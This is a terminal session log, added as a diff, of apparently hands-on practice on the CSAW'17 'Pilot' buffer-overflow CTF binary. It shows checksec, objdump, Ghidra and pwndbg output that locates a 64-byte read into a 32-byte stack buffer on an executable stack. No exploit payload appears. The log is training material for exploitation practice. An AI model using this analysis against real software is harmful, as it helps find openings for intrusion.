@@ -1,0 +1,1037 @@
+4008b0:	31 ed                	xor    ebp,ebp
+  4008b2:	49 89 d1             	mov    r9,rdx
+  4008b5:	5e                   	pop    rsi
+  4008b6:	48 89 e2             	mov    rdx,rsp
+  4008b9:	48 83 e4 f0          	and    rsp,0xfffffffffffffff0
+  4008bd:	50                   	push   rax
+  4008be:	54                   	push   rsp
+  4008bf:	49 c7 c0 00 0c 40 00 	mov    r8,0x400c00
+  4008c6:	48 c7 c1 90 0b 40 00 	mov    rcx,0x400b90
+  4008cd:	48 c7 c7 a6 09 40 00 	mov    rdi,0x4009a6
+  4008d4:	e8 57 ff ff ff       	call   400830 <__libc_start_main@plt>
+  4008d9:	f4                   	hlt
+  4008da:	66 0f 1f 44 00 00    	nop    WORD PTR [rax+rax*1+0x0]
+  4008e0:	b8 7f 20 60 00       	mov    eax,0x60207f
+  4008e5:	55                   	push   rbp
+  4008e6:	48 2d 78 20 60 00    	sub    rax,0x602078
+  4008ec:	48 83 f8 0e          	cmp    rax,0xe
+  4008f0:	48 89 e5             	mov    rbp,rsp
+  4008f3:	76 1b                	jbe    400910 <__gmon_start__@plt+0x70>
+                                                                                                                 
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ exit  
+asciinema: recording finished
+asciinema: asciicast saved to pilot.cast
+                                                                                                                 
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ rm pilot.cast 
+                                                                                                                 
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ asciinema rec pilot.cast
+asciinema: recording asciicast to pilot.cast
+asciinema: press <ctrl-d> or type "exit" when you're done
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ ls
+ghidra.txt  pilot  pilot.cast
+                                                                                                                 
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ file pilot
+pilot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6ed26a43b94fd3ff1dd15964e4106df72c01dc6c, stripped
+                                                                                                                 
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ pwn checksec pilot                             
+[*] "/home/himanshu/Desktop/Github/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot/pilot"
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE (0x400000)
+    Stack:      Executable
+    RWX:        Has RWX segments
+                                                                                                                 
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ cat ghidra.txt 
+entry:
+
+void processEntry entry(undefined8 param_1,undefined8 param_2)
+
+{
+  undefined1 auStack_8 [8];
+  
+  __libc_start_main(FUN_004009a6,param_2,&stack0x00000008,FUN_00400b90,FUN_00400c00,param_1,
+                    auStack_8);
+  do {
+                    /* WARNING: Do nothing block with infinite loop */
+  } while( true );
+}
+
+main :
+
+undefined8 FUN_004009a6(void)
+
+{
+  ostream *poVar1;
+  ssize_t sVar2;
+  undefined8 uVar3;
+  undefined1 local_28 [32];
+  
+  setvbuf(stdout,(char *)0x0,2,0);
+  setvbuf(stdin,(char *)0x0,2,0);
+  poVar1 = std::operator<<((ostream *)std::cout,"[*]Welcome DropShip Pilot...");
+  std::ostream::operator<<(poVar1,std::endl<>);
+  poVar1 = std::operator<<((ostream *)std::cout,"[*]I am your assitant A.I....");
+  std::ostream::operator<<(poVar1,std::endl<>);
+  poVar1 = std::operator<<((ostream *)std::cout,"[*]I will be guiding you through the tutorial....")
+  ;
+  std::ostream::operator<<(poVar1,std::endl<>);
+  poVar1 = std::operator<<((ostream *)std::cout,
+                           "[*]As a first step, lets learn how to land at the designated location... ."
+                          );
+  std::ostream::operator<<(poVar1,std::endl<>);
+  poVar1 = std::operator<<((ostream *)std::cout,
+                           "[*]Your mission is to lead the dropship to the right location and execut e sequence of instructions to save Marines & Medics..."
+                          );
+  std::ostream::operator<<(poVar1,std::endl<>);
+  poVar1 = std::operator<<((ostream *)std::cout,"[*]Good Luck Pilot!....");
+  std::ostream::operator<<(poVar1,std::endl<>);
+  poVar1 = std::operator<<((ostream *)std::cout,"[*]Location:");
+  poVar1 = (ostream *)std::ostream::operator<<(poVar1,local_28);
+  std::ostream::operator<<(poVar1,std::endl<>);
+  std::operator<<((ostream *)std::cout,"[*]Command:");
+  sVar2 = read(0,local_28,0x40);
+  if (sVar2 < 5) {
+    poVar1 = std::operator<<((ostream *)std::cout,"[*]There are no commands....");
+    std::ostream::operator<<(poVar1,std::endl<>);
+    poVar1 = std::operator<<((ostream *)std::cout,"[*]Mission Failed....");
+    std::ostream::operator<<(poVar1,std::endl<>);
+    uVar3 = 0xffffffff;
+  }
+  else {
+    uVar3 = 0;
+  }
+  return uVar3;
+}
+
+                                                                                                                 
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ main : 4009a6 ->   __libc_start_main(FUN_004009a6,param_2,&stack0x00000008,FUN_00400b90,FUN_00400c00,param_1, 
+                    auStack_8);
+
+zsh: parse error near `)'
+                                                                                                                 
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ objdump -d pilot -M intel | head -n 100
+
+pilot:     file format elf64-x86-64
+
+
+Disassembly of section .init:
+
+00000000004007c8 <.init>:
+  4007c8:	48 83 ec 08          	sub    rsp,0x8
+  4007cc:	48 8b 05 25 18 20 00 	mov    rax,QWORD PTR [rip+0x201825]        # 601ff8 <__gmon_start__@plt+0x201758>
+  4007d3:	48 85 c0             	test   rax,rax
+  4007d6:	74 05                	je     4007dd <setvbuf@plt-0x23>
+  4007d8:	e8 c3 00 00 00       	call   4008a0 <__gmon_start__@plt>
+  4007dd:	48 83 c4 08          	add    rsp,0x8
+  4007e1:	c3                   	ret
+
+Disassembly of section .plt:
+
+00000000004007f0 <setvbuf@plt-0x10>:
+  4007f0:	ff 35 12 18 20 00    	push   QWORD PTR [rip+0x201812]        # 602008 <__gmon_start__@plt+0x201768>
+  4007f6:	ff 25 14 18 20 00    	jmp    QWORD PTR [rip+0x201814]        # 602010 <__gmon_start__@plt+0x201770>
+  4007fc:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
+
+0000000000400800 <setvbuf@plt>:
+  400800:	ff 25 12 18 20 00    	jmp    QWORD PTR [rip+0x201812]        # 602018 <__gmon_start__@plt+0x201778>
+  400806:	68 00 00 00 00       	push   0x0
+  40080b:	e9 e0 ff ff ff       	jmp    4007f0 <setvbuf@plt-0x10>
+
+0000000000400810 <_ZNSt8ios_base4InitC1Ev@plt>:
+  400810:	ff 25 0a 18 20 00    	jmp    QWORD PTR [rip+0x20180a]        # 602020 <__gmon_start__@plt+0x201780>
+  400816:	68 01 00 00 00       	push   0x1
+  40081b:	e9 d0 ff ff ff       	jmp    4007f0 <setvbuf@plt-0x10>
+
+0000000000400820 <read@plt>:
+  400820:	ff 25 02 18 20 00    	jmp    QWORD PTR [rip+0x201802]        # 602028 <__gmon_start__@plt+0x201788>
+  400826:	68 02 00 00 00       	push   0x2
+  40082b:	e9 c0 ff ff ff       	jmp    4007f0 <setvbuf@plt-0x10>
+
+0000000000400830 <__libc_start_main@plt>:
+  400830:	ff 25 fa 17 20 00    	jmp    QWORD PTR [rip+0x2017fa]        # 602030 <__gmon_start__@plt+0x201790>
+  400836:	68 03 00 00 00       	push   0x3
+  40083b:	e9 b0 ff ff ff       	jmp    4007f0 <setvbuf@plt-0x10>
+
+0000000000400840 <__cxa_atexit@plt>:
+  400840:	ff 25 f2 17 20 00    	jmp    QWORD PTR [rip+0x2017f2]        # 602038 <__gmon_start__@plt+0x201798>
+  400846:	68 04 00 00 00       	push   0x4
+  40084b:	e9 a0 ff ff ff       	jmp    4007f0 <setvbuf@plt-0x10>
+
+0000000000400850 <_ZNSt8ios_base4InitD1Ev@plt>:
+  400850:	ff 25 ea 17 20 00    	jmp    QWORD PTR [rip+0x2017ea]        # 602040 <__gmon_start__@plt+0x2017a0>
+  400856:	68 05 00 00 00       	push   0x5
+  40085b:	e9 90 ff ff ff       	jmp    4007f0 <setvbuf@plt-0x10>
+
+0000000000400860 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>:
+  400860:	ff 25 e2 17 20 00    	jmp    QWORD PTR [rip+0x2017e2]        # 602048 <__gmon_start__@plt+0x2017a8>
+  400866:	68 06 00 00 00       	push   0x6
+  40086b:	e9 80 ff ff ff       	jmp    4007f0 <setvbuf@plt-0x10>
+
+0000000000400870 <_ZNSolsEPKv@plt>:
+  400870:	ff 25 da 17 20 00    	jmp    QWORD PTR [rip+0x2017da]        # 602050 <__gmon_start__@plt+0x2017b0>
+  400876:	68 07 00 00 00       	push   0x7
+  40087b:	e9 70 ff ff ff       	jmp    4007f0 <setvbuf@plt-0x10>
+
+0000000000400880 <_ZNSolsEPFRSoS_E@plt>:
+  400880:	ff 25 d2 17 20 00    	jmp    QWORD PTR [rip+0x2017d2]        # 602058 <__gmon_start__@plt+0x2017b8>
+  400886:	68 08 00 00 00       	push   0x8
+  40088b:	e9 60 ff ff ff       	jmp    4007f0 <setvbuf@plt-0x10>
+
+0000000000400890 <_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@plt>:
+  400890:	ff 25 ca 17 20 00    	jmp    QWORD PTR [rip+0x2017ca]        # 602060 <__gmon_start__@plt+0x2017c0>
+  400896:	68 09 00 00 00       	push   0x9
+  40089b:	e9 50 ff ff ff       	jmp    4007f0 <setvbuf@plt-0x10>
+
+Disassembly of section .plt.got:
+
+00000000004008a0 <__gmon_start__@plt>:
+  4008a0:	ff 25 52 17 20 00    	jmp    QWORD PTR [rip+0x201752]        # 601ff8 <__gmon_start__@plt+0x201758>
+  4008a6:	66 90                	xchg   ax,ax
+
+Disassembly of section .text:
+
+00000000004008b0 <.text>:
+  4008b0:	31 ed                	xor    ebp,ebp
+  4008b2:	49 89 d1             	mov    r9,rdx
+  4008b5:	5e                   	pop    rsi
+  4008b6:	48 89 e2             	mov    rdx,rsp
+  4008b9:	48 83 e4 f0          	and    rsp,0xfffffffffffffff0
+  4008bd:	50                   	push   rax
+  4008be:	54                   	push   rsp
+  4008bf:	49 c7 c0 00 0c 40 00 	mov    r8,0x400c00
+  4008c6:	48 c7 c1 90 0b 40 00 	mov    rcx,0x400b90
+  4008cd:	48 c7 c7 a6 09 40 00 	mov    rdi,0x4009a6
+  4008d4:	e8 57 ff ff ff       	call   400830 <__libc_start_main@plt>
+  4008d9:	f4                   	hlt
+  4008da:	66 0f 1f 44 00 00    	nop    WORD PTR [rax+rax*1+0x0]
+  4008e0:	b8 7f 20 60 00       	mov    eax,0x60207f
+  4008e5:	55                   	push   rbp
+  4008e6:	48 2d 78 20 60 00    	sub    rax,0x602078
+  4008ec:	48 83 f8 0e          	cmp    rax,0xe
+  4008f0:	48 89 e5             	mov    rbp,rsp
+  4008f3:	76 1b                	jbe    400910 <__gmon_start__@plt+0x70>
+                                                                                                                 
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ 4008c6:     48 c7 c1 90 0b 40 00    mov    rcx,0x400b90
+  4008cd:       48 c7 c7 a6 09 40 00    mov    rdi,0x4009a6
+  4008d4:       e8 57 ff ff ff          call   400830 <__libc_start_main@plt>
+
+zsh: parse error near `\n'
+                                                                                                                 
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ 0x4009a6
+0x4009a6: command not found
+                                                                                                                 
+┌──(himanshu㉿Kaaammui)-[~/…/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot]
+└─$ gdb ./pilot
+GNU gdb (Debian 16.3-1) 16.3
+Copyright (C) 2024 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+pwndbg: loaded 209 pwndbg commands. Type pwndbg [filter] for a list.
+pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
+Reading symbols from ./pilot...
+(No debugging symbols found in ./pilot)
+------- tip of the day (disable with set show-tips off) -------
+break-if-taken and break-if-not-taken commands sets breakpoints after a given jump instruction was taken or not
+pwndbg> start
+
+Program stopped.
+0x00007ffff7fe3440 in _start () from /lib64/ld-linux-x86-64.so.2
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────
+ RAX  0x38
+ RBX  0
+ RCX  0x7fffffffdcb8 —▸ 0x7fffffffe080 ◂— 0x5245545f5353454c ('LESS_TER')
+ RDX  0x7ffff7fcbc80 (_dl_fini) ◂— push rbp
+ RDI  0x7ffff7ffe310 ◂— 0
+ RSI  0x7ffff7ffe8e8 ◂— 0
+ R8   0x7ffff7bf1ac0 (main_arena) ◂— 0
+ R9   1
+ R10  0x7ffff7bf1ac0 (main_arena) ◂— 0
+ R11  0x11ff
+ R12  0x4008b0 ◂— xor ebp, ebp
+ R13  0x7fffffffdca0 ◂— 1
+ R14  0
+ R15  0
+ RBP  0
+ RSP  0x7fffffffdca0 ◂— 1
+ RIP  0x4008b0 ◂— xor ebp, ebp
+──────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────
+ ► 0x4008b0    xor    ebp, ebp                    EBP => 0
+   0x4008b2    mov    r9, rdx                     R9 => 0x7ffff7fcbc80 (_dl_fini) ◂— push rbp
+   0x4008b5    pop    rsi                         RSI => 1
+   0x4008b6    mov    rdx, rsp                    RDX => 0x7fffffffdca8 —▸ 0x7fffffffe035 ◂— '/home/himanshu/Desktop/Github/CTF-Practice/pwn/01....'
+   0x4008b9    and    rsp, 0xfffffffffffffff0     RSP => 0x7fffffffdca0 (0x7fffffffdca8 & -0x10)
+   0x4008bd    push   rax
+   0x4008be    push   rsp
+   0x4008bf    mov    r8, 0x400c00                R8 => 0x400c00 ◂— repz ret 
+   0x4008c6    mov    rcx, 0x400b90               RCX => 0x400b90 ◂— push r15
+   0x4008cd    mov    rdi, 0x4009a6               RDI => 0x4009a6 ◂— push rbp
+   0x4008d4    call   __libc_start_main@plt       <__libc_start_main@plt>
+────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
+00:0000│ r13 rsp 0x7fffffffdca0 ◂— 1
+01:0008│         0x7fffffffdca8 —▸ 0x7fffffffe035 ◂— "/home/himanshu/Desktop/Github/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot/pilot"
+02:0010│         0x7fffffffdcb0 ◂— 0
+03:0018│ rcx     0x7fffffffdcb8 —▸ 0x7fffffffe080 ◂— 0x5245545f5353454c ('LESS_TER')
+04:0020│         0x7fffffffdcc0 —▸ 0x7fffffffe095 ◂— 'POWERSHELL_TELEMETRY_OPTOUT=1'
+05:0028│         0x7fffffffdcc8 —▸ 0x7fffffffe0b3 ◂— 'LANGUAGE=en_IN:en'
+06:0030│         0x7fffffffdcd0 —▸ 0x7fffffffe0c5 ◂— 'USER=himanshu'
+07:0038│         0x7fffffffdcd8 —▸ 0x7fffffffe0d3 ◂— 0x5245545f5353454c ('LESS_TER')
+──────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────
+ ► 0         0x4008b0 None
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> b *0x4009a6
+Breakpoint 1 at 0x4009a6
+pwndbg> c
+Continuing.
+
+Breakpoint 1, 0x00000000004009a6 in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────
+*RAX  0x4009a6 ◂— push rbp
+*RBX  0x7fffffffdca8 —▸ 0x7fffffffe035 ◂— "/home/himanshu/Desktop/Github/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot/pilot"
+*RCX  0x160
+*RDX  0x7fffffffdcb8 —▸ 0x7fffffffe080 ◂— 0x5245545f5353454c ('LESS_TER')
+*RDI  1
+*RSI  0x7fffffffdca8 —▸ 0x7fffffffe035 ◂— "/home/himanshu/Desktop/Github/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot/pilot"
+*R8   0x400c00 ◂— repz ret 
+*R9   0x7ffff7fcbc80 (_dl_fini) ◂— push rbp
+*R10  6
+*R11  0x7ffff7a4bbe0 (__cxa_atexit) ◂— lea rcx, [rip + 0x1a5a99]
+*R12  0
+*R13  0x7fffffffdcb8 —▸ 0x7fffffffe080 ◂— 0x5245545f5353454c ('LESS_TER')
+*R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 ◂— 0
+ R15  0
+*RBP  1
+*RSP  0x7fffffffdb98 —▸ 0x7ffff7a33ca8 (__libc_start_call_main+120) ◂— mov edi, eax
+*RIP  0x4009a6 ◂— push rbp
+──────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────
+ ► 0x4009a6    push   rbp
+   0x4009a7    mov    rbp, rsp                            RBP => 0x7fffffffdb90 ◂— 1
+   0x4009aa    sub    rsp, 0x20                           RSP => 0x7fffffffdb70 (0x7fffffffdb90 - 0x20)
+   0x4009ae    mov    rax, qword ptr [rip + 0x2017fb]     RAX, [stdout] => 0x7ffff7bf25c0 (_IO_2_1_stdout_) ◂— 0xfbad2084
+   0x4009b5    mov    ecx, 0                              ECX => 0
+   0x4009ba    mov    edx, 2                              EDX => 2
+   0x4009bf    mov    esi, 0                              ESI => 0
+   0x4009c4    mov    rdi, rax                            RDI => 0x7ffff7bf25c0 (_IO_2_1_stdout_) ◂— 0xfbad2084
+   0x4009c7    call   setvbuf@plt                 <setvbuf@plt>
+ 
+   0x4009cc    mov    rax, qword ptr [rip + 0x2016ad]     RAX, [stdin]
+   0x4009d3    mov    ecx, 0                              ECX => 0
+────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
+00:0000│ rsp 0x7fffffffdb98 —▸ 0x7ffff7a33ca8 (__libc_start_call_main+120) ◂— mov edi, eax
+01:0008│     0x7fffffffdba0 —▸ 0x7fffffffdbe0 —▸ 0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 ◂— 0
+02:0010│     0x7fffffffdba8 —▸ 0x4009a6 ◂— push rbp
+03:0018│     0x7fffffffdbb0 ◂— 0x1ffffdbe0
+04:0020│     0x7fffffffdbb8 —▸ 0x7fffffffdca8 —▸ 0x7fffffffe035 ◂— "/home/himanshu/Desktop/Github/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot/pilot"
+05:0028│     0x7fffffffdbc0 —▸ 0x7fffffffdca8 —▸ 0x7fffffffe035 ◂— "/home/himanshu/Desktop/Github/CTF-Practice/pwn/01.BOF/CSAW'17: Pilot/pilot"
+06:0030│     0x7fffffffdbc8 ◂— 0xdafc5118b81c5a37
+07:0038│     0x7fffffffdbd0 ◂— 0
+──────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────
+ ► 0         0x4009a6 None
+   1   0x7ffff7a33ca8 __libc_start_call_main+120
+   2   0x7ffff7a33d65 __libc_start_main+133
+   3         0x4008d9 None
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> x/30i $rip
+=> 0x4009a6:	push   rbp
+   0x4009a7:	mov    rbp,rsp
+   0x4009aa:	sub    rsp,0x20
+   0x4009ae:	mov    rax,QWORD PTR [rip+0x2017fb]        # 0x6021b0 <stdout>
+   0x4009b5:	mov    ecx,0x0
+   0x4009ba:	mov    edx,0x2
+   0x4009bf:	mov    esi,0x0
+   0x4009c4:	mov    rdi,rax
+   0x4009c7:	call   0x400800 <setvbuf@plt>
+   0x4009cc:	mov    rax,QWORD PTR [rip+0x2016ad]        # 0x602080 <stdin>
+   0x4009d3:	mov    ecx,0x0
+   0x4009d8:	mov    edx,0x2
+   0x4009dd:	mov    esi,0x0
+   0x4009e2:	mov    rdi,rax
+   0x4009e5:	call   0x400800 <setvbuf@plt>
+   0x4009ea:	mov    esi,0x400c19
+   0x4009ef:	mov    edi,0x6020a0
+   0x4009f4:	call   0x400860 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
+   0x4009f9:	mov    esi,0x400890
+   0x4009fe:	mov    rdi,rax
+   0x400a01:	call   0x400880 <_ZNSolsEPFRSoS_E@plt>
+   0x400a06:	mov    esi,0x400c36
+   0x400a0b:	mov    edi,0x6020a0
+   0x400a10:	call   0x400860 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
+   0x400a15:	mov    esi,0x400890
+   0x400a1a:	mov    rdi,rax
+   0x400a1d:	call   0x400880 <_ZNSolsEPFRSoS_E@plt>
+   0x400a22:	mov    esi,0x400c58
+   0x400a27:	mov    edi,0x6020a0
+   0x400a2c:	call   0x400860 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
+pwndbg> x/60i $rip
+=> 0x4009a6:	push   rbp
+   0x4009a7:	mov    rbp,rsp
+   0x4009aa:	sub    rsp,0x20
+   0x4009ae:	mov    rax,QWORD PTR [rip+0x2017fb]        # 0x6021b0 <stdout>
+   0x4009b5:	mov    ecx,0x0
+   0x4009ba:	mov    edx,0x2
+   0x4009bf:	mov    esi,0x0
+   0x4009c4:	mov    rdi,rax
+   0x4009c7:	call   0x400800 <setvbuf@plt>
+   0x4009cc:	mov    rax,QWORD PTR [rip+0x2016ad]        # 0x602080 <stdin>
+   0x4009d3:	mov    ecx,0x0
+   0x4009d8:	mov    edx,0x2
+   0x4009dd:	mov    esi,0x0
+   0x4009e2:	mov    rdi,rax
+   0x4009e5:	call   0x400800 <setvbuf@plt>
+   0x4009ea:	mov    esi,0x400c19
+   0x4009ef:	mov    edi,0x6020a0
+   0x4009f4:	call   0x400860 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
+   0x4009f9:	mov    esi,0x400890
+   0x4009fe:	mov    rdi,rax
+   0x400a01:	call   0x400880 <_ZNSolsEPFRSoS_E@plt>
+   0x400a06:	mov    esi,0x400c36
+   0x400a0b:	mov    edi,0x6020a0
+   0x400a10:	call   0x400860 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
+   0x400a15:	mov    esi,0x400890
+   0x400a1a:	mov    rdi,rax
+   0x400a1d:	call   0x400880 <_ZNSolsEPFRSoS_E@plt>
+   0x400a22:	mov    esi,0x400c58
+   0x400a27:	mov    edi,0x6020a0
+   0x400a2c:	call   0x400860 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
+   0x400a31:	mov    esi,0x400890
+   0x400a36:	mov    rdi,rax
+   0x400a39:	call   0x400880 <_ZNSolsEPFRSoS_E@plt>
+   0x400a3e:	mov    esi,0x400c90
+   0x400a43:	mov    edi,0x6020a0
+   0x400a48:	call   0x400860 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
+   0x400a4d:	mov    esi,0x400890
+   0x400a52:	mov    rdi,rax
+   0x400a55:	call   0x400880 <_ZNSolsEPFRSoS_E@plt>
+   0x400a5a:	mov    esi,0x400ce0
+   0x400a5f:	mov    edi,0x6020a0
+   0x400a64:	call   0x400860 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
+   0x400a69:	mov    esi,0x400890
+   0x400a6e:	mov    rdi,rax
+   0x400a71:	call   0x400880 <_ZNSolsEPFRSoS_E@plt>
+   0x400a76:	mov    esi,0x400d5f
+   0x400a7b:	mov    edi,0x6020a0
+   0x400a80:	call   0x400860 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
+   0x400a85:	mov    esi,0x400890
+   0x400a8a:	mov    rdi,rax
+   0x400a8d:	call   0x400880 <_ZNSolsEPFRSoS_E@plt>
+   0x400a92:	mov    esi,0x400d77
+   0x400a97:	mov    edi,0x6020a0
+   0x400a9c:	call   0x400860 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
+   0x400aa1:	mov    rdx,rax
+   0x400aa4:	lea    rax,[rbp-0x20]
+   0x400aa8:	mov    rsi,rax
+   0x400aab:	mov    rdi,rdx
+   0x400aae:	call   0x400870 <_ZNSolsEPKv@plt>
+   0x400ab3:	mov    esi,0x400890
+pwndbg> x/100i $rip
+=> 0x4009a6:	push   rbp
+   0x4009a7:	mov    rbp,rsp
+   0x4009aa:	sub    rsp,0x20
+   0x4009ae:	mov    rax,QWORD PTR [rip+0x2017fb]        # 0x6021b0 <stdout>
+   0x4009b5:	mov    ecx,0x0
+   0x4009ba:	mov    edx,0x2
+   0x4009bf:	mov    esi,0x0
+   0x4009c4:	mov    rdi,rax
+   0x4009c7:	call   0x400800 <setvbuf@plt>
+   0x4009cc:	mov    rax,QWORD PTR [rip+0x2016ad]        # 0x602080 <stdin>
+   0x4009d3:	mov    ecx,0x0
+   0x4009d8:	mov    edx,0x2
+   0x4009dd:	mov    esi,0x0
+   0x4009e2:	mov    rdi,rax
+   0x4009e5:	call   0x400800 <setvbuf@plt>
+   0x4009ea:	mov    esi,0x400c19
+   0x4009ef:	mov    edi,0x6020a0
+   0x4009f4:	call   0x400860 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
+   0x4009f9:	mov    esi,0x400890
+   0x4009fe:	mov    rdi,rax
+   0x400a01:	call   0x400880 <_ZNSolsEPFRSoS_E@plt>
+   0x400a06:	mov    esi,0x400c36
+   0x400a0b:	mov    edi,0x6020a0
+   0x400a10:	call   0x400860 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
+   0x400a15:	mov    esi,0x400890
+   0x400a1a:	mov    rdi,rax
+   0x400a1d:	call   0x400880 <_ZNSolsEPFRSoS_E@plt>
+   0x400a22:	mov    esi,0x400c58
+   0x400a27:	mov    edi,0x6020a0
+   0x400a2c:	call   0x400860 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
+   0x400a31:	mov    esi,0x400890
+   0x400a36:	mov    rdi,rax
+   0x400a39:	call   0x400880 <_ZNSolsEPFRSoS_E@plt>
+   0x400a3e:	mov    esi,0x400c90
+   0x400a43:	mov    edi,0x6020a0
+   0x400a48:	call   0x400860 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
+   0x400a4d:	mov    esi,0x400890
+   0x400a52:	mov    rdi,rax
+   0x400a55:	call   0x400880 <_ZNSolsEPFRSoS_E@plt>
+   0x400a5a:	mov    esi,0x400ce0
+   0x400a5f:	mov    edi,0x6020a0
+   0x400a64:	call   0x400860 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
+   0x400a69:	mov    esi,0x400890
+   0x400a6e:	mov    rdi,rax
+   0x400a71:	call   0x400880 <_ZNSolsEPFRSoS_E@plt>
+   0x400a76:	mov    esi,0x400d5f
+   0x400a7b:	mov    edi,0x6020a0
+   0x400a80:	call   0x400860 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
+   0x400a85:	mov    esi,0x400890
+   0x400a8a:	mov    rdi,rax
+   0x400a8d:	call   0x400880 <_ZNSolsEPFRSoS_E@plt>
+   0x400a92:	mov    esi,0x400d77
+   0x400a97:	mov    edi,0x6020a0
+   0x400a9c:	call   0x400860 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
+   0x400aa1:	mov    rdx,rax
+   0x400aa4:	lea    rax,[rbp-0x20]
+   0x400aa8:	mov    rsi,rax
+   0x400aab:	mov    rdi,rdx
+   0x400aae:	call   0x400870 <_ZNSolsEPKv@plt>
+   0x400ab3:	mov    esi,0x400890
+   0x400ab8:	mov    rdi,rax
+   0x400abb:	call   0x400880 <_ZNSolsEPFRSoS_E@plt>
+   0x400ac0:	mov    esi,0x400d84
+   0x400ac5:	mov    edi,0x6020a0
+   0x400aca:	call   0x400860 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
+   0x400acf:	lea    rax,[rbp-0x20]
+   0x400ad3:	mov    edx,0x40
+   0x400ad8:	mov    rsi,rax
+   0x400adb:	mov    edi,0x0
+   0x400ae0:	call   0x400820 <read@plt>
+   0x400ae5:	cmp    rax,0x4
+   0x400ae9:	setle  al
+   0x400aec:	test   al,al
+   0x400aee:	je     0x400b2f
+   0x400af0:	mov    esi,0x400d90
+   0x400af5:	mov    edi,0x6020a0
+   0x400afa:	call   0x400860 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
